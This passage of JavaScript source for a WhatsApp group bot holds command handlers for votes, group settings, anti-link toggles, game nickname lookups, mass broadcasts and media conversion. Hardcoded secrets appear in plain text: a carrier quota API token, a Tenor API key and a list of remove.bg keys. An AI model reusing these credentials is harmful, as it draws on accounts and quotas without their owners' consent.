${vote[m.chat][2].map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')}

*${prefix}hapusvote* - to delete votes
`
Manik.sendTextWithMentions(m.chat, teks_vote, m)
break
		case prefix+'deletevote': case prefix+'delvote': case prefix+'hapusvote':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - to start voting`
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
               case prefix+'group': case prefix+'grup':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (args[1] === 'tutup'){
                    await Manik.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Group Berhasil di Tutup !`)).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'buka'){
                    await Manik.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Group Berhasil di Buka !`)).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'open'){
                    await Manik.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Group Berhasil di Buka !`)).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'close'){
                    await Manik.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Group Berhasil di Tutup !`)).catch((err) => reply(jsonformat(err)))
                }else {
                let buttons = [
                        { buttonId: prefix+'group open', buttonText: { displayText: 'OPEN' }, type: 1 },
                        { buttonId: prefix+'group close', buttonText: { displayText: 'CLOSE' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `Group Mode`, Manik.user.name, m)

             }
            }
            break
            case prefix+'editinfo':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
             if (args[1] === 'open'){
                await Manik.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else if (args[1] === 'close'){
                await Manik.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Close Edit Group Info`)).catch((err) => reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: prefix+'editinfo open', buttonText: { displayText: 'OPEN' }, type: 1 },
                        { buttonId: prefix+'editinfo close', buttonText: { displayText: 'CLOSE' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `Mode Edit Info`, Manik.user.name, m)

            }
            }
            break
                        case prefix+'antiyt':
        if (!m.isGroup) return reply(mess.group)
			if (!isAdmins) return reply(mess.admin)
			
			if (!args[1]) return reply(`Pilih *.antiyt on / off*`)
			if (!isBotAdmins) return reply(mess.botAdmin)
					if (args[1] === 'on') {
            if (isAntiYt) return reply(`Udah aktif`)
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            antiyt.push(from)
            fs.writeFileSync('./database/antiyt.json', JSON.stringify(antiyt, null, 3))
            reply('Anti link youtube aktif')
        } else if (args[1] === 'off') {
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            let anu = antiyt.indexOf(from)
            antiyt.splice(anu, 1)
            fs.writeFileSync('./database/antiyt.json', JSON.stringify(antiyt, null, 3))
            reply('Anti link youtube nonaktif')
            }
            break
			
			
        case prefix+'antitele':
        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			
			if (!args[1]) return reply(`Pilih *.antitele on / off*`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[1] === 'on') {
            if (isAntiTele) return reply(`Udah aktif`)
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            antitele.push(from)
            fs.writeFileSync('./database/antitele.json', JSON.stringify(antitele, null, 3))
            reply('Antilink Telegram aktif')
        } else if (args[1] === 'off') {
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            let anu = antitele.indexOf(from)
            antitele.splice(anu, 1)
            fs.writeFileSync('./database/antitele.json', JSON.stringify(antitele, null, 3))
            reply('Antilink Telegram nonaktif')
            }
            break
			
		case prefix+'antibadword':
        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!args[1]) return reply(`Pilih *.antibadword on / off*`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[1] === 'on') {
            if (isAntiBadword) return reply(`Udah aktif`)
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            antibadword.push(from)
            fs.writeFileSync('./database/antibadword.json', JSON.stringify(antibadword, null, 3))
            reply('Anti Badword aktif')
        } else if (args[1] === 'off') {
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            let anu = antibadword.indexOf(from)
            antibadword.splice(anu, 1)
            fs.writeFileSync('./database/antibadword.json', JSON.stringify(antibadword, null, 3))
            reply('Anti Badword nonaktif')
            }
            break
			
case prefix+"kuota":{
var token = "dc6ee117-1164-4bd2-81c6-c35eeebe58e5"
if (q) token = q
function bar(p) {
let titik = "▒".repeat(10).split("")

for (let i = 1; i <= p; i++) {
if (i%10 == 0) {
titik[(i/10)-1] = "█";
}
}
return "[ " + titik.join(" ") + " ]";
}
let axios = require('axios')
var { data } = await axios({
"headers": {
"Authorization": token,
"User-Agent": "okhttp/4.2.2"
},
"method": "GET",
"url": "https://quota.api.axis.co.id/quota"
})
let {result} = JSON.parse(atob(data.data))
let sisakuota = ''
for (let kuota of result.detail) {
let dateberlaku = new Date(kuota.benefitData.activeUntil)
let bulan0 = dateberlaku.toLocaleDateString('id', {month: 'long'})
let bulan = bulan0[0]+bulan0[1]+bulan0[2]
sisakuota += `*${kuota.name}*\n${bar(kuota.percentRemaining)}\nSISA ${kuota.remaining}\nBerlaku s.d. ${dateberlaku.getDate()} ${bulan} ${dateberlaku.getFullYear()} ${dateberlaku.getHours()}:${dateberlaku.getMinutes()}\n\n`
}
Manik.sendMessage(from, { text: sisakuota }, {quoted: m})
break
}
            case prefix+'antibitly':
        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!args[1]) return reply(`Pilih *.antibitly on / off*`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[1] === 'on') {
            if (isAntiBitly) return reply(`Udah aktif`)
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            antibitly.push(from)
            fs.writeFileSync('./database/antibitly.json', JSON.stringify(antibitly, null, 3))
            reply('Antilink Bitly aktif')
        } else if (args[1] === 'off') {
            if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
            let anu = antibitly.indexOf(from)
            antibitly.splice(anu, 1)
            fs.writeFileSync('./database/antibitly.json', JSON.stringify(antibitly, null, 3))
            reply('Antilink Bitly nonaktif')
        }
        break
case prefix+'antilink':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[1] === 'on') {
						if (isAntiLink) return reply('```SUDAH DI AKTIFKAN SEBELUMNYA```')
						antilink.push(m.chat)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('```FITUR ANTILINK BERHASIL DI AKTIFKAN```')
						await Manik.sendMessage(m.chat,  {text: `*ALLERT!!!* This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[1] === 'off') {
						if (!isAntiLink) return reply('```SUDAH DI NONAKTIFKAN SEBELUMNYA```')
						var ini = antilink.indexOf(m.chat)
						antilink.splice(ini, 1)
						fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
						reply('```FITUR ANTILINK BERHASIL DI NONAKTIFKAN```')
					} else if (!q){
 reply(`Pilih .Antilink On / Off `)
					}
					break

case prefix+'antibug':
	        if (!m.isGroup) return reply(`This feature only be used in group`)
			if (!isAdmins) return reply(`This feature could be used by admin only`)
			if (!isBotAdmins) return reply(`Bot must be admin first`)
					if (args[1] === 'on') {
						if (isAntiVirtex) return reply('```SUDAH DI AKTIFKAN SEBELUMNYA```')
						antivirtex.push(m.chat)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
						reply('```FITUR ANTIVIRTEX BERHASIL DI AKTIFKAN```')
						await Manik.sendMessage(m.chat,  {text: `*ALLERT!!!* This group has been installed anti-link\nIf you violate then I will kick`})
					} else if (args[1] === 'off') {
						if (!isAntiVirtex) return reply('```SUDAH DI NONAKTIFKAN SEBELUMNYA```')
						var ini = antivirtex.indexOf(m.chat)
						antivirtex.splice(ini, 1)
						fs.writeFileSync('./database/antivirtex.json', JSON.stringify(antivirtex))
						reply('```FITUR ANTIVIRTEX BERHASIL DI NONAKTIFKAN```')
					} else if (!q){
 reply(`Pilih .Antivirtex On / Off `)
					}
					break 
					
					case prefix+'antiwame':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
			 if (!args[1]) return reply(`Pilih *.antiwame on / off*`)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (args[1] === "on") {
                if (db.chats[m.chat].wame) return reply(`Already Activated`)
                db.chats[m.chat].wame = true
                reply(`Anti Wa.me Activated!`)
                } else if (args[1] === "off") {
                if (!db.chats[m.chat].wame) return reply(`Already deactivated`)
                db.chats[m.chat].wame = false
                reply(`Anti Wa.me is not activated!`)
                } else {
                 let buttons = [
                        { buttonId: prefix+'antiwame on', buttonText: { displayText: 'ENABLE' }, type: 1 },
                        { buttonId: prefix+'antiwame off', buttonText: { displayText: 'DISABLE' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `Mode Anti Wa.me`, Manik.user.name, m)
                }
             }
             break
             // Menu Search
        case prefix+'nickff':{
        const axios = require('axios')
if (!q) return reply(`Gunakan dengan cara ${command} *id*\n\n_Contoh_\n\n${command} 646675175`)
            axios.get(`https://api.lolhuman.xyz/api/freefire/${args[1]}?apikey=${lolkey}`)
            .then(({data}) => {
            let epep = `*🔎 CHECK NICK FREE FIRE 🔍*

ID : ${args[1]}
Nick : ${data.result}`
            reply(epep)
            
            })
            .catch((err) => {
                reply('Error')
            })
            break
            }
        case prefix+'nickml':{
        const axios = require('axios')
 var args1 = q.split("/")[0]
            var args2 = q.split("/")[1]                
            if (!q.includes("/")) return reply(`Gunakan dengan cara ${command} *id/server*\n\n_Contoh_\n\n${command} 617243212/8460`)
            axios.get(`https://api.lolhuman.xyz/api/mobilelegend/${args1}/${args2}?apikey=${lolkey}`)
            .then(({data}) => {
            let emel = `*🔎 CHECK NICK MOBILE LEGENDS 🔍*

ID : ${args[1]}
Nick : ${data.result}`
reply(emel)
            
            })
            .catch((err) => {
                reply('Error')
            })
            break
            }
        case prefix+'nickpubg':{
        const axios = require('axios')
            if (!q) return reply(`Gunakan dengan cara ${command} *id*\n\n_Contoh_\n\n${command} 5217933016`)
            axios.get(`https://api.lolhuman.xyz/api/pubg/${args[1]}?apikey=${lolkey}`)
            .then(({data}) => {
            let pubg = `*🔎 CHECK NICK PUBG 🔍*

ID : ${args[1]}
Nick : ${data.result}`
            reply(pubg)
            
            })
            .catch((err) => {
                reply('Error')
            })
            break
            }
        case prefix+'nickdomino':{
        const axios = require('axios')
               if (!q) return reply(`Gunakan dengan cara ${command} *id*\n\n_Contoh_\n\n${command} 291756557`)
            axios.get(`https://api.lolhuman.xyz/api/higghdomino/${args[1]}?apikey=${lolkey}`)
            .then(({data}) => {
            let domino = `*🔎 CHECK NICK HIGGS DOMINO 🔍*

ID : ${args[1]}
Nick : ${data.result}`
            reply(domino)
            limitAdd(sender, limit)
            })
            .catch((err) => {
                reply('Error')
            })
            break
            }
					   case prefix+'mute':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins) return reply(mess.admin)
                if (args[1] === "on") {
                if (db.chath[m.chat].mute) return reply(`Already activated`)
                db.chats[m.chat].mute = true
                reply(`${Manik.user.name} has been muted in this group !`)
                } else if (args[1] === "off") {
                if (!db.chats[m.chat].mute) return reply(`Already deactivated`)
                db.chats[m.chat].mute = false
                reply(`${Manik.user.name} has been unmuted in this group!`)
                } else {
                 let buttons = [
                        { buttonId: prefix+'mute on', buttonText: { displayText: 'MUTE' }, type: 1 },
                        { buttonId: prefix+'mute off', buttonText: { displayText: 'UNMUTE' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, `Mute Bot`, Manik.user.name, m)
                }
             }
             break
             case prefix+'rules':
             rulesBot = `

 # RULES BOT

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

4. Gpp sc gw jelek yg penting 
Bot gw jalan awokawoak
Jika sudah dipahami rules-nya, silakan ketik *#menu* untuk memulai!

Owner  BOTZ:
wa.me/6283155997772
`
             reply(rulesBot)
             break
            case prefix+'linkgroup': case prefix+'grouplink': case prefix+'gclink': case prefix+'linkgc':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                let response = await Manik.groupInviteCode(m.chat)
                Manik.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink of: ${groupMetadata.subject} Group`, m, { detectLink: true })
            }
            break
            case prefix+'ephemeral':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!text) return reply `Enter the enable/disable value, For Example ${prefix}ephemeral enable`
                if (args[1] === 'enable') {
                    await Manik.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'disable') {
                    await Manik.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break
            case prefix+'delete': case prefix+'del':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
			 if (!m.quoted) throw false
                if (!m.quoted) return reply(`Silahkan balas pesan yang ingin di hapus !`)
                let { chat, fromMe, id, isBaileys, participant } = m.quoted
               if (!isBaileys) return reply(`The message was not sent by a bot!`)
               Manik.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case prefix+'bcgc': case prefix+'bcgroup':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                if (!text) return reply(`Where is the text?\n\nExample : ${command} hello guys, am back`)
                let getGroups = await Manik.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
				for (let i of anu) {
                    await sleep(1500)
                    let txt = `*「 BROADCAST BOT 」*\n\n${text}`
				 Manik.sendMessage(i, { text: txt })
                    }
                await reply(`Successful Sending Broadcast To ${anu.length} Group(s)`)
				//await reply(jsonformat(anu))
            }
            break
			
			case prefix+'listgc':{
              addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                let getGroups = await Manik.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
				let teks = `❏ *GROUP CHAT LIST*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await Manik.groupMetadata(i)
                     teks += `≻ *Name :* ${metadata.subject}\n≻ *Owner :* @${metadata.owner.split('@')[0]}\n≻ *ID :* ${metadata.id}\n≻ *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n≻ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 Manik.sendTextWithMentions(m.chat, teks, m)
			}
             break
			
			case prefix+'listpc':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                 let anu = await stire.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `❏ *PERSONAL CHAT LIST*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = stire.messages[i].array[0].pushName
                     teks += `≻ *Name :* ${nama}\n≻ *User :* @${i.split('@')[0]}\n≻ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 Manik.sendTextWithMentions(m.chat, teks, m)
             }
             break
			 
            case prefix+'bc': case prefix+'broadcast': case prefix+'bcall':{
            	if (!isManik) return reply(mess.owner)
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                if (!text) return reply `Where is the text?\n\nExample : ${command} halo`
                let anu = await stire.chats.all().map(v => v.id)
                reply(`Send Broadcast To ${anu.length} Chat\nIn ${anu.length * 1.5} second`)
		for (let yoi of anu) {
		    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Group Bot',
                                    url: 'https://chat.whatsapp.com/E14rIyYMuovIfkskhi5QN9'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Owner',
                                    id: 'owner'
                                }
                            }]
                      manixgans = fs.readFileSync('./media/Manik.jpg')
                      let txt = `「 BROADCAST BOT 」\n\n${text}`
                      Manik.send5ButImg(yoi, txt, `${ownerName}`, manixgans, btn)
		}
		reply('Broadcast Success')
            }
            break
            case prefix+'chatinfo':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.quoted) return reply('Reply to mesaage')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) return reply `The message was not sent by a bot!`
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += `≻ @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━≻ *Time :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ≻ *Status :* ${read ? 'Read' : 'Unread'}\n\n`
                }
                Manik.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case prefix+'q': case prefix+'quoted':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!m.quoted) return reply('Reply Message!!')
		let wokwol = await Manik.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return reply('The message you replied to does not contain a reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
		
		 
               case prefix+'listonline': case prefix+'onlinelist': case prefix+'liston':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                    let id = args && /\d+\-\d+@g.us/.test(args[1]) ? args[1] : m.chat
                    let online = [...Object.keys(stire.presences[id]), botNumber]
                    Manik.sendText(m.chat, 'Online List:\n\n' + online.map(v => '≻ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
			 
			 
            case prefix+'sticker': case prefix+'s': case prefix+'stickergif': case prefix+'sgif':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!quoted) return reply `Balas Video/Image Dengan Caption ${command}`
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await Manik.sendImageAsSticker(m.chat, media, m, { packName: global.packName, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await Manik.sendVideoAsSticker(m.chat, media, m, { packName: global.packName, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                reply `Kirim Gambar/Video Dengan Caption ${command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case prefix+'ebinary':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!m.quoted.text && !text) return reply `Kirim/reply text dengan caption ${command}`
            let { eBinary } = require('./FuncBot/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            reply(eb)
        }
        break
            case prefix+'dbinary':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!m.quoted.text && !text) return reply `Kirim/reply text dengan caption ${command}`
            let { dBinary } = require('./FuncBot/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            reply(db)
        }
        break
            case prefix+'emojimix': {
				let [emoji1, emoji2] = text.split`+`
				if (!emoji1) return m.reply(`Example : ${command} 🗿+😄`)
				if (!emoji2) return m.reply(`Example : ${command} 😄+🗿`)
				let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
				for (let res of anu.results) {
				    let encmedia = await Manik.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
				    await fs.unlinkSync(encmedia)
				}
	 		   }
	  		  break
			case prefix+'emojimix2': {
	  		  if (!text) return m.reply(`Example : ${command} 🗿`)
				let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
				for (let res of anu.results) {
		  	  let encmedia = await Manik.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		 	   await fs.unlinkSync(encmedia)
				}
	  		  }
	  		  break
	        
            case prefix+'toimage': case prefix+'toimg':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!quoted) return reply(`Reply Image`)
                if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${command}*`)
                let media = await Manik.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    Manik.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case prefix+'tomp4': case prefix+'tovideo':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	        if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!quoted) return reply `Reply Image`
                if (!/webp/.test(mime)) return reply `balas stiker dengan caption *${command}*`
		let { webp2mp4File } = require('./FuncBot/uploader')
                let media = await Manik.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Manik.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case prefix+'toaud': case prefix+'toaudio':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${command}`
            if (!quoted) return reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${command}`
            let media = await quoted.download()
            let { toAudio } = require('./FuncBot/converter')
            let audio = await toAudio(media, 'mp4')
            Manik.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case prefix+'tomp3':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (/document/.test(mime)) return reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${command}`
            if (!quoted) return reply `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${command}`
            let media = await quoted.download()
            let { toAudio } = require('./FuncBot/converter')
            let audio = await toAudio(media, 'mp4')
            Manik.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${Manik.user.name}.mp3`}, { quoted : m })
            }
            break
            case prefix+'tovn': case prefix+'toptt':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!/video/.test(mime) && !/audio/.test(mime)) return reply `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${command}`
            if (!quoted) return reply `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${command}`
            let media = await quoted.download()
            let { toPTT } = require('./FuncBot/converter')
            let audio = await toPTT(media, 'mp4')
            Manik.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case prefix+'togif':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!quoted) return reply `Reply Image`
                if (!/webp/.test(mime)) return reply `balas stiker dengan caption *${command}*`
		let { webp2mp4File } = require('./FuncBot/uploader')
                let media = await Manik.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await Manik.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case prefix+'tourl':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	        if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./FuncBot/uploader')
                let media = await Manik.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case prefix+'imagenobg': case prefix+'removebg': case prefix+'remove-bg':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
	    if (!quoted) return reply `Kirim/Reply Image Dengan Caption ${command}`
	    if (!/image/.test(mime)) return reply `Kirim/Reply Image Dengan Caption ${command}`
	    if (/webp/.test(mime)) return reply `Kirim/Reply Image Dengan Caption ${command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await Manik.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    Manik.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case prefix+'yts': case prefix+'ytsearch':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	    if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!text) return reply `Example : ${command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `≻ No : ${no++}\n≻ Type : ${i.type}\n≻ Video ID : ${i.videoId}\n≻ Title : ${i.title}\n≻ Views : ${i.views}\n≻ Duration : ${i.timestamp}\n≻ Upload At : ${i.ago}\n≻ Author : ${i.author.name}\n≻ Url : ${i.url}\n\n─────────────────\n\n`
                }
